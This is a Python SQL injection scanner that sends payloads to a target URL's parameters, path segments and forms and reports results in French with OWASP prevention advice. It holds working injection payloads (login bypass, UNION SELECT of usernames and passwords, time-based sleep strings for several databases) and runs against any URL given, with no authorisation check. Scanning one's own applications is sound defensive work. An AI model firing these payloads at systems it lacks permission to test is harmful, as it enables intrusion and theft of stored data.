import requests
import re
import sys
import argparse
import time
from urllib.parse import urlparse, urljoin, parse_qs, urlunparse, urlencode
from bs4 import BeautifulSoup
import random

# Ensure proper encoding for output
import io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

class SQLiTester:
    def __init__(self, url, intensity='medium', auth=None, follow_redirects=True, max_depth=2):
        self.original_url = url
        self.url = url
        self.intensity = intensity.lower()
        self.auth = auth
        self.follow_redirects = follow_redirects
        self.max_depth = max_depth
        self.timeout = 10 if intensity == 'thorough' else 5
        
        # Base payloads that work on many databases
        self.basic_payloads = [
            "' OR 1=1 --",
            "' OR '1'='1' --",
            "' OR 1=1#",
            "admin' --",
            "1' OR '1'='1",
            "' UNION SELECT 1,2,3 --",
            "'; WAITFOR DELAY '0:0:5' --"  # Time-based payload
        ]
        
        # More advanced payloads for thorough testing
        self.advanced_payloads = [
            # MySQL specific
            "' OR 1=1 -- -",
            "' OR sleep(5) --",
            "' UNION SELECT @@version, NULL, NULL --",
            "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --",
            
            # MSSQL specific
            "' OR 1=1; WAITFOR DELAY '0:0:5' --",
            "'; IF 1=1 WAITFOR DELAY '0:0:5' --",
            "'; SELECT CASE WHEN 1=1 THEN WAITFOR DELAY '0:0:5' ELSE 0 END --",
            
            # PostgreSQL specific
            "' OR 1=1; SELECT pg_sleep(5) --",
            "'; SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE 0 END --",
            
            # Oracle specific
            "' OR 1=1; DBMS_LOCK.SLEEP(5) --",
            "' UNION SELECT NULL,username,password FROM users --",
            
            # SQLite specific
            "' OR 1=1 LIMIT 1 --",
            "' UNION SELECT sqlite_version(), NULL, NULL --"
        ]
        
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5"
        }
        
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        
        # Custom cookies for more flexibility
        self.session.cookies.update({"session_id": "test", "visitor": "scanner"})
        
        # Authentication if provided
        if auth and 'username' in auth and 'password' in auth:
            self.perform_login(auth)

    def perform_login(self, auth):
        """Attempt to login with provided credentials"""
        if 'login_url' in auth and auth['login_url']:
            login_url = auth['login_url']
            username = auth['username']
            password = auth['password']
            
            # Try common login field names
            login_payloads = [
                {"username": username, "password": password},
                {"user": username, "pass": password},
                {"email": username, "password": password},
                {"login": username, "password": password},
                {"user_id": username, "password": password}
            ]
            
            # Try each payload
            for payload in login_payloads:
                try:
                    response = self.session.post(login_url, data=payload, timeout=self.timeout)
                    # Check if login was successful
                    if "logout" in response.text.lower() or "dashboard" in response.text.lower() or "profile" in response.text.lower():
                        print(f"[INFO] Login successful using fields: {payload.keys()}")
                        return True
                except:
                    continue
            
            print("[INFO] Login attempt failed")
        return False

    def extract_forms(self, url):
        try:
            response = self.session.get(url, timeout=self.timeout, allow_redirects=self.follow_redirects)
            soup = BeautifulSoup(response.text, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"[INFO] Error extracting forms: {e}")
            return []

    def extract_form_details(self, form):
        details = {
            "action": form.get("action", ""),
            "method": form.get("method", "get").lower(),
            "inputs": []
        }
        
        # Extract all input fields
        for input_tag in form.find_all(["input", "textarea", "select"]):
            input_type = input_tag.get("type", "text")
            input_name = input_tag.get("name")
            input_value = input_tag.get("value", "")
            
            if input_name:
                details["inputs"].append({
                    "type": input_type,
                    "name": input_name,
                    "value": input_value
                })
                
        return details

    def submit_form(self, form_details, payload):
        target_url = self.url
        if form_details["action"]:
            target_url = urljoin(self.url, form_details["action"])
            
        inputs = form_details["inputs"]
        data = {}
        
        for input_field in inputs:
            name = input_field["name"]
            input_type = input_field["type"]
            
            if input_type in ["text", "search", "hidden", "email", "password", "number"]:
                data[name] = payload
            else:
                # Preserve original values for non-text fields
                data[name] = input_field.get("value", "")
                
        if form_details["method"] == "post":
            return self.session.post(target_url, data=data, headers=self.headers, 
                                   timeout=self.timeout, allow_redirects=self.follow_redirects)
        else:
            return self.session.get(target_url, params=data, headers=self.headers, 
                                  timeout=self.timeout, allow_redirects=self.follow_redirects)

    def test_url_parameters(self, url, payloads):
        """Test URL parameters for SQL injection"""
        vulnerable_params = []
        
        # Parse URL
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # No query parameters? Try some common ones
        if not query_params:
            test_params = ['id', 'user_id', 'item', 'page', 'product', 'category', 'article', 'news']
            for param in test_params:
                for payload in payloads:
                    test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
                    try:
                        response = self.session.get(test_url, headers=self.headers, 
                                                  timeout=self.timeout, allow_redirects=self.follow_redirects)
                        
                        # Check for signs of SQL injection
                        if self.check_sqli_success(response, payload):
                            vulnerable_params.append(param)
                            break
                    except requests.RequestException:
                        continue
        else:
            # Test each existing parameter
            for param, values in query_params.items():
                # Keep track of original value to restore it later
                original_value = values[0] if values else ""
                
                for payload in payloads:
                    # Update this parameter with payload
                    new_params = query_params.copy()
                    new_params[param] = [payload]
                    
                    # Rebuild URL with new params
                    new_query = urlencode(new_params, doseq=True)
                    new_url = urlunparse((
                        parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                        parsed_url.params, new_query, parsed_url.fragment
                    ))
                    
                    try:
                        response = self.session.get(new_url, headers=self.headers, 
                                                  timeout=self.timeout, allow_redirects=self.follow_redirects)
                        
                        # Check for signs of SQL injection
                        if self.check_sqli_success(response, payload):
                            vulnerable_params.append(param)
                            break
                    except requests.RequestException:
                        continue
        
        return vulnerable_params

    def test_full_path_injection(self, url, payloads):
        """Test path-based parameters for SQL injection (e.g. /user/1)"""
        vulnerable_paths = []
        
        parsed_url = urlparse(url)
        path_parts = parsed_url.path.split('/')
        
        # Look for numeric path components that might be IDs
        for i, part in enumerate(path_parts):
            if part.isdigit():
                for payload in payloads:
                    # Replace this path component with payload
                    new_path_parts = path_parts.copy()
                    new_path_parts[i] = payload
                    new_path = '/'.join(new_path_parts)
                    
                    # Rebuild the URL
                    new_url = urlunparse((
                        parsed_url.scheme, parsed_url.netloc, new_path,
                        parsed_url.params, parsed_url.query, parsed_url.fragment
                    ))
                    
                    try:
                        response = self.session.get(new_url, headers=self.headers, 
                                                  timeout=self.timeout, allow_redirects=self.follow_redirects)
                        
                        # Check for signs of SQL injection
                        if self.check_sqli_success(response, payload):
                            vulnerable_paths.append(f"Path component {i+1}")
                            break
                    except requests.RequestException:
                        continue
        
        return vulnerable_paths

    def test_sql_injection(self):
        is_vulnerable = False
        vulnerable_points = []
        
        # Determine which payloads to use based on intensity
        if self.intensity == 'fast':
            payloads = self.basic_payloads[:3]
        elif self.intensity == 'thorough':
            payloads = self.basic_payloads + self.advanced_payloads
        else:  # medium
            payloads = self.basic_payloads
        
        # Test URL parameters
        vulnerable_params = self.test_url_parameters(self.url, payloads)
        if vulnerable_params:
            is_vulnerable = True
            vulnerable_points.extend([f"URL parameter: {param}" for param in vulnerable_params])
        
        # Test path-based parameters if in thorough mode
        if self.intensity == 'thorough':
            vulnerable_paths = self.test_full_path_injection(self.url, payloads)
            if vulnerable_paths:
                is_vulnerable = True
                vulnerable_points.extend(vulnerable_paths)
        
        # Test forms
        forms = self.extract_forms(self.url)
        for i, form in enumerate(forms):
            form_details = self.extract_form_details(form)
            
            # Try each payload on this form
            for payload in payloads:
                try:
                    response = self.submit_form(form_details, payload)
                    
                    # Check for signs of SQL injection
                    if self.check_sqli_success(response, payload):
                        is_vulnerable = True
                        form_location = f"Form #{i+1}"
                        if form_details["action"]:
                            form_location += f" (action: {form_details['action']})"
                        if form_details["inputs"]:
                            vulnerable_inputs = [input_field["name"] for input_field in form_details["inputs"] 
                                               if input_field["type"] in ["text", "search", "hidden", "email", "password", "number"]]
                            form_location += f" (fields: {', '.join(vulnerable_inputs)})"
                        vulnerable_points.append(form_location)
                        break
                except Exception as e:
                    print(f"[INFO] Error testing form: {e}")
                    continue

        # Output results in format expected by server.js parser
        if is_vulnerable:
            print("[VULNERABLE] Le site est vulnérable à l'injection SQL")
            print(f"[LOCATION] {'; '.join(vulnerable_points)}")
            print("[PREVENTION] Pour prévenir les injections SQL:")
            print("1. Utilisez des requêtes paramétrées (prepared statements)")
            print("2. Utilisez un ORM (Object-Relational Mapping)")
            print("3. Validez et filtrez toutes les entrées utilisateur")
            print("4. Appliquez le principe du moindre privilège aux comptes de base de données")
            print("5. Utilisez des procédures stockées avec des paramètres")
            print("[DETAILS] L'injection SQL permet à un attaquant d'insérer des instructions SQL malveillantes dans l'application, pouvant compromettre la base de données entière.")
            print("[IMPACT] Un attaquant pourrait accéder, modifier ou supprimer des données sensibles, contourner l'authentification, ou exécuter des commandes sur le serveur.")
            print("[SEVERITY] HIGH")
            print("[REFERENCE] https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html")
        else:
            print("[OK] Le site n'est pas vulnérable à l'injection SQL")

    def check_sqli_success(self, response, payload):
        """Check if a SQL injection attempt was successful"""
        # Check for SQL errors
        if self.check_error(response.text):
            return True
            
        # Check for successful login bypass
        if self.check_successful_login(response):
            return True
            
        # Check for time-based injection (only if payload contains sleep or waitfor)
        if ('sleep' in payload.lower() or 'waitfor' in payload.lower() or 'pg_sleep' in payload.lower()) and response.elapsed.total_seconds() > 4:
            return True
            
        # Check for differences in content that might indicate successful injection
        if 'UNION SELECT' in payload and (response.text.count('null') > 2 or response.text.count('NULL') > 2):
            return True
            
        return False

    def check_error(self, response_text):
        sql_errors = [
            "You have an error in your SQL syntax",
            "mysql_fetch_array()",
            "Warning: mysql_",
            "ODBC Driver",
            "Unclosed quotation mark",
            "PostgreSQL query failed",
            "PSQLException",
            "SQL syntax error",
            "ORA-",
            "Oracle error",
            "Microsoft SQL Server",
            "syntax error at or near",
            "SQLite3::query",
            "SQL command not properly ended",
            "[SQLITE_ERROR]",
            "DB2 SQL error",
            "SQLSTATE",
            "Database error"
        ]
        return any(re.search(error, response_text, re.IGNORECASE) for error in sql_errors)
    
    def check_successful_login(self, response):
        # Look for signs of successful login/access after SQL injection
        success_indicators = [
            "admin",
            "dashboard",
            "profile",
            "welcome",
            "logged in",
            "authenticated",
            "admin panel",
            "control panel",
            "management"
        ]
        
        # Check if status code is successful
        if response.status_code == 200:
            # Check for success indicators in the URL or content
            if any(indicator in response.url.lower() for indicator in success_indicators):
                return True
            if any(indicator in response.text.lower() for indicator in success_indicators):
                return True
                
        return False

def parse_arguments():
    parser = argparse.ArgumentParser(description='SQL Injection Vulnerability Scanner')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('--intensity', choices=['fast', 'medium', 'thorough'], default='medium',
                        help='Scan intensity: fast, medium, or thorough')
    parser.add_argument('--username', help='Username for authentication')
    parser.add_argument('--password', help='Password for authentication')
    parser.add_argument('--login-url', help='URL for login page')
    parser.add_argument('--follow-redirects', action='store_true', help='Follow HTTP redirects')
    parser.add_argument('--max-depth', type=int, default=2, help='Maximum depth for crawling')
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_arguments()
    
    # Setup authentication if provided
    auth = None
    if args.username and args.password:
        auth = {
            'username': args.username,
            'password': args.password,
            'login_url': args.login_url
        }
    
    # Create and run the tester
    tester = SQLiTester(
        args.url, 
        intensity=args.intensity,
        auth=auth,
        follow_redirects=args.follow_redirects,
        max_depth=args.max_depth
    )
    tester.test_sql_injection()